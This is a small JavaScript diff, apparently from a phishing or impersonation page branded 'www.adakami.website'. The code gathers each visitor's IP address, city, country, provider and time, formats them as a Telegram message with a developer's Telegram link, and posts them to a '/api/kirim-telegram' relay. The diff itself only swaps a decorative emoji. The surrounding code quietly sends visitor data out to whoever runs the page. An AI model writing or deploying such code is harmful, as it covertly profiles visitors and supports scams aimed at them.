@@ -313,7 +313,7 @@
                     return res.json();
                 })
                 .then(data => {
-                    const infoPesan = `<b></b>\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b>（ ͜.人 ͜.）</b> www.adakami.website 𓀐𓂺\n<b>IP:</b> <code>${data.ip || '-'}</code>\n<b>Kota:</b> ${data.city || '-'} \n<b>Negara:</b> ${data.country_name || '-'}\n<b>Provider:</b> ${data.org || '-'}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')} my\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b>𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 https://t.me/gitlab_v1</b>`;
+                    const infoPesan = `<b></b>\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b>𓀐𓂺</b> www.adakami.website 𓀐𓂺\n<b>IP:</b> <code>${data.ip || '-'}</code>\n<b>Kota:</b> ${data.city || '-'} \n<b>Negara:</b> ${data.country_name || '-'}\n<b>Provider:</b> ${data.org || '-'}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')} my\n﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n<b>𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 https://t.me/gitlab_v1</b>`;
 
                     fetch('/api/kirim-telegram', {
                         method: 'POST',
